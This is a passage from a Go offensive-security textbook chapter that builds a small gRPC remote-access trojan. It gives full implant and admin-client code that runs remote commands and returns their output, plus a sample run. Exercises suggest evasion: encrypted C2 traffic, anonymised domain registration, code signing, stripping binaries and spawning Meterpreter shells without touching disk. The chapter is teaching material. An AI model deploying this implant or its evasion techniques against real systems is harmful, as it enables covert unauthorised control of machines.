cutes the operating system command and sends the output back to the server. 
Listing 14­4 shows the contents of implant/implant.go.
324   Chapter 14
func main() {
    var
    (
        opts   []grpc.DialOption
        conn   *grpc.ClientConn
        err    error
        client grpcapi.ImplantClient u
    )
    opts = append(opts, grpc.WithInsecure())
    if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil { v
        log.Fatal(err)
    }
    defer conn.Close()
    client = grpcapi.NewImplantClient(conn) w
    ctx := context.Background()
    for { x
        var req = new(grpcapi.Empty)
        cmd, err := client.FetchCommand(ctx, req) y
        if err != nil {
            log.Fatal(err)
        } 
        if cmd.In == "" {
            // No work
            time.Sleep(3*time.Second)
            continue
        }
        tokens := strings.Split(cmd.In, " ") z
        var c *exec.Cmd
        if len(tokens) == 1 {
            c = exec.Command(tokens[0])
        } else {
            c = exec.Command(tokens[0], tokens[1:]...)
        }
        buf, err := c.CombinedOutput(){
        if err != nil {
            cmd.Out = err.Error()
        }
        cmd.Out += string(buf)
        client.SendOutput(ctx, cmd) |
    }
}
Listing 14-4: Creating the implant (/ch-14/implant/implant.go) 
The implant code contains a main() function only. We start by declar­
ing our variables, including one of the grpcapi.ImplantClient type u. The 
protoc command automatically created this type for us. The type has all the 
required RPC function stubs necessary to facilitate remote communications. 
We then establish a connection, via grpc.Dial(target string, opts... 
DialOption), to the implant server running on port 4444 v. We’ll use this 
Building a Command-and-Control RAT    325
connection for the call to grpcapi.NewImplantClient(conn) w (a function that 
protoc created for us). We now have our gRPC client, which should have an 
established connection back to our implant server.
Our code proceeds to use an infinite for loop x to poll the implant 
server, repeatedly checking to see if there’s work that needs to be performed. 
It does this by issuing a call to client.FetchCommand(ctx, req), passing it a 
request context and Empty struct y. Behind the scenes, it’s connecting 
to our API server. If the response we receive doesn’t have anything in the 
cmd.In field, we pause for 3 seconds and then try again. When a unit of work 
is received, the implant splits the command into individual words and argu­
ments by calling strings.Split(cmd.In, " ") z. This is necessary because 
Go’s syntax for executing operating system commands is exec.Command(name, 
args...), where name is the command to be run and args... is a list of any 
subcommands, flags, and arguments used by that operating system com­
mand. Go does this to prevent operating system command injection, but it 
complicates our execution, because we have to split up the command into 
relevant pieces before we can run it. We run the command and gather out­
put by running c.CombinedOutput() {. Lastly, we take that output and initiate 
a gRPC call to client.SendOutput(ctx, cmd) to send our command and its out­
put back to the server |.
Your implant is complete, and you can run it via go run implant/implant.go.  
It should connect to your server. Again, it’ll be anticlimactic, as there’s no 
work to be performed. Just a couple of running processes, making a con­
nection but doing nothing meaningful. Let’s fix that.
Building the Admin Component
The admin component is the final piece to our RAT. It’s where we’ll actu­
ally produce work. The work will get sent, via our admin gRPC API, to the 
server, which then forwards it on to the implant. The server gets the output 
from the implant and sends it back to the admin client. Listing 14­5 shows 
the code in client/client.go.
func main() {
    var
    (
        opts   []grpc.DialOption
        conn   *grpc.ClientConn
        err    error
        client grpcapi.AdminClient u
    )
    opts = append(opts, grpc.WithInsecure())
    if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil { v
        log.Fatal(err)
    }
    defer conn.Close()
    client = grpcapi.NewAdminClient(conn) w
326   Chapter 14
    var cmd = new(grpcapi.Command)
    cmd.In = os.Args[1] x
    ctx := context.Background()
    cmd, err = client.RunCommand(ctx, cmd) y
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println(cmd.Out) z
}
Listing 14-5: Creating the admin client (/ch-14/client/client.go)
We start by defining our grpcapi.AdminClient variable u, establishing a 
connection to our administrative server on port 9090 v, and using the con­
nection in a call to grpcapi.NewAdminClient(conn) w, creating an instance of our 
admin gRPC client. (Remember that the grpcapi.AdminClient type and grpcapi 
.NewAdminClient() function were created for us by protoc.) Before we proceed, 
compare this client creation process with that of the implant code. Notice the 
similarities, but also the subtle differences in types, function calls, and ports.
Assuming there is a command line argument, we read the operating 
system command from it x. Of course, the code would be more robust if we 
checked whether an argument was passed in, but we’re not worried about it 
for this example. We assign that command string to the cmd.In. We pass this 
cmd, a *grpcapi.Command instance, to our gRPC client’s RunCommand(ctx context 
.Context, cmd *grpcapi.Command) method y. Behind the scenes, this command 
gets serialized and sent to the admin server we created earlier. After the 
response is received, we expect the output to populate with the operating 
system command results. We write that output to the console z.
Running the RAT
Now, assuming you have both the server and the implant running, you can 
execute your admin client via go run client/client.go command. You should 
receive the output in your admin client terminal and have it displayed to 
the screen, like this:
$ go run client/client.go 'cat /etc/resolv.conf'
domain Home
nameserver 192.168.0.1
nameserver 205.171.3.25
There it is—a working RAT. The output shows the contents of a remote 
file. Run some other commands to see your implant in action. 
Improving the RAT
As we mentioned at the beginning of this chapter, we purposely kept this 
RAT small and feature­bare. It won’t scale well. It doesn’t gracefully handle 
errors or connection disruptions, and it lacks a lot of basic features that 
Building a Command-and-Control RAT    327
allow you to evade detection, move across networks, escalate privileges, 
and more. 
Rather than making all these improvements in our example, we instead 
lay out a series of enhancements that you can make on your own. We’ll dis­
cuss some of the considerations but will leave each as an exercise for you. 
To complete these exercises, you’ll likely need to refer to other chapters of 
this book, dig deeper into Go package documentation, and experiment with 
using channels and concurrency. It’s an opportunity to put your knowledge 
and skills to a practical test. Go forth and make us proud, young Padawan.
Encrypt Your Communications
All C2 utilities should encrypt their network traffic! This is especially 
impor tant for communications between the implant and the server, as 
you should expect to find egress network monitoring in any modern 
enterprise environment. 
Modify your implant to use TLS for these communications. This will 
require you to set additional values for the []grpc.DialOptions slice on the 
client as well as on the server. While you’re at it, you should probably alter 
your code so that services are bound to a defined interface, and listen and 
connect to localhost by default. This will prevent unauthorized access.
A consideration you’ll have to make, particularly if you’ll be perform­
ing mutual certificate­based authentication, is how to administer and man­
age the certificates and keys in the implant. Should you hardcode them? 
Store them remotely? Derive them at runtime with some magic voodoo that 
determines whether your implant is authorized to connect to your server?
Handle Connection Disruptions
While we’re on the topic of communications, what happens if your implant 
can’t connect to your server or if your server dies with a running implant? 
You may have noticed that it breaks everything—the implant dies. If the 
implant dies, well, you’ve lost access to that system. This can be a pretty big 
deal, particularly if the initial compromise happened in a manner that’s 
hard to reproduce. 
Fix this problem. Add some resilience to your implant so that it doesn’t 
immediately die if a connection is lost. This will likely involve replacing calls 
to log.Fatal(err) in your implant.go file with logic that calls grpc.Dial(target 
string, opts ...DialOption) again.
Register the Implants
You’ll want to be able to track your implants. At present, our admin client 
sends a command expecting only a single implant to exist. There is no means 
of tracking or registering an implant, let alone any means of sending a com­
mand to a specific implant. 
Add functionality that makes an implant register itself with the server 
upon initial connection, and add functionality for the admin client to 
retrieve a list of registered implants. Perhaps you assign a unique integer  
328   Chapter 14
to each implant or use a UUID (check out https://github.com/google/uuid/). 
This will require changes to both the admin and implant APIs, starting with 
your implant.proto file. Add a RegisterNewImplant RPC method to the Implant 
service, and add ListRegisteredImplants to the Admin service. Recompile the 
schema with protoc, implement the appropriate interface methods in server/
server.go, and add the new functionality to the logic in client/client.go (for the 
admin side) and implant/implant.go (for the implant side).
Add Database Persistence 
If you completed the previous exercises in this section, you added some 
resilience to the implants to withstand connection disruptions and set up 
registration functionality. At this point, you’re most likely maintaining the 
list of registered implants in memory in server/server.go. What if you need to 
restart the server or it dies? Your implants will continue to reconnect, but 
when they do, your server will be unaware of which implants are registered, 
because you’ll have lost the mapping of the implants to their UUID. 
Update your server code to store this data in a database of your choos­
ing. For a fairly quick and easy solution with minimal dependencies, con­
sider a SQLite database. Several Go drivers are available. We personally 
used go-sqlite3 (https://github.com/mattn/go-sqlite3/).
Support Multiple Implants
Realistically, you’ll want to support multiple simultaneous implants polling 
your server for work. This would make your RAT significantly more useful, 
because it could manage more than a single implant, but it requires pretty 
significant changes as well. 
That’s because, when you wish to execute a command on an implant, 
you’ll likely want to execute it on a single specific implant, not the first one 
that polls the server for work. You could rely on the implant ID created 
during registration to keep the implants mutually exclusive, and to direct 
commands and output appropriately. Implement this functionality so that 
you can explicitly choose the destination implant on which the command 
should be run. 
Further complicating this logic, you’ll need to consider that you might 
have multiple admin operators sending commands out simultaneously, 
as is common when working with a team. This means that you’ll probably 
want to convert your work and output channels from unbuffered to buffered 
types. This will help keep execution from blocking when there are multiple 
messages in­flight. However, to support this sort of multiplexing, you’ll 
need to implement a mechanism that can match a requestor with its proper 
response. For example, if two admin operators send work simultaneously 
to implants, the implants will generate two separate responses. If opera­
tor 1 sends the ls command and operator 2 sends the ifconfig command, 
it wouldn’t be appropriate for operator 1 to receive the command output 
for ifconfig, and vice versa.
Building a Command-and-Control RAT    329
Add Implant Functionality
Our implementation expects the implants to receive and run operating 
system commands only. However, other C2 software contains a lot of other 
convenience functions that would be nice to have. For example, it would 
be nice to be able to upload or download files to and from our implants. It 
might be nice to run raw shellcode, in the event we want to, for example, 
spawn a Meterpreter shell without touching disk. Extend the current func­
tionality to support these additional features.
Chain Operating System Commands
Because of the way Go’s os/exec package creates and runs commands, you 
can’t currently pipe the output of one command as input into a second 
command. For example, this won’t work in our current implementation: 
ls -la | wc -l. To fix this, you’ll need to play around with the command 
variable, which is created when you call exec.Command() to create the com­
mand instance. You can alter the stdin and stdout properties to redirect 
them appropriately. When used in conjunction with an io.Pipe, you can 
force the output of one command (ls -la, for example) to act as the input 
into a subsequent command (wc -l).
Enhance the Implant’s Authenticity and Practice Good OPSEC
When you added encrypted communications to the implant in the first 
exercise in this section, did you use a self­signed certificate? If so, the 
transport and backend server may arouse suspicion in devices and inspect­
ing proxies. Instead, register a domain name by using private or anony­
mized contact details in conjunction with a certificate authority service 
to create a legitimate certificate. Further, if you have the means to do so, 
consider obtaining a code­signing certificate to sign your implant binary.
Additionally, consider revising the naming scheme for your source code 
locations. When you build your binary file, the file will include package 
paths. Descriptive pathnames may lead incident responders back to you. 
Further, when building your binary, consider removing debugging infor­
mation. This has the added benefit of making your binary size smaller and 
more difficult to disassemble. The following command can achieve this:
$ go build -ldflags="-s -w" implant/implant.go
These flags are passed to the linker to remove debugging information 
and strip the binary.
Add ASCII Art
Your implementation could be a hot mess, but if it has ASCII art, it’s legiti­
mate. Okay, we’re not serious about that. But every security tool seems 
to have ASCII art for some reason, so maybe you should add it to yours. 
Greetz optional.
330   Chapter 14
Summary
Go is a great language for writing cross­platform implants, like the RAT you 
built in this chapter. Creating the implant was likely the most difficult part 
of this project, because using Go to interact with the underlying operating 
system can be challenging compared to languages designed for the operat­
ing system API, such as C# and the Windows API. Additionally, because Go 
builds to a statically compiled binary, implants may result in a large binary 
size, which may add some restrictions on delivery. 
But for backend services, there is simply nothing better. One of the 
authors of this book (Tom) has an ongoing bet with another author (Dan) 
that if he ever switches from using Go for backend services and general 
utility, he’ll have to pay $10,000. There is no sign of him switching anytime 
soon (although Elixir looks cool). Using all the techniques described in 
this book, you should have a solid foundation to start building some robust 
frameworks and utilities. 
We hope you enjoyed reading this book and participating in the exercises 
as much as we did writing it. We encourage you to keep writing Go and use 
the skills learned in this book to build small utilities that enhance or replace 
your current tasks. Then, as you gain experience, start working on larger 
codebases and build some awesome projects. To continue growing your skills, 
look at some of the more popular large Go projects, particularly from large 
organizations. Watch talks from conferences, such as GopherCon, that can 
guide you through more advanced topics, and have discussions on pitfalls 
and ways to enhance your programming. Most importantly, have fun—and 
if you build something neat, tell us about it! Catch you on the flippity­flip.
IN DE X
bin directory, 2
binaries, 2
binary data handling, 213–216
Bing, 68–76
bodyType parameter, 46
braces, 14
break statements, 14
brute force, 252–261
buffer overflow fuzzing, 188–192
buffered channels, 29, 37–39
bufio package, 38, 112–113, 197
build command, 7
build constraints, 7–8
byte slices, 19
bytes package, 197
C
C, 201–212, 290–293
C transform, 213
Caddy Server, 127
.Call() method, 273
canonical name (CNAME) records, 
109–111
capture() function, 184
CGO package, 291
channels, 16–17
Checker interface, 220–222
Cipher Block Chaining (CBC) 
mode, 242
ciphertext, 234
cleartext
overview, 234
passwords, 150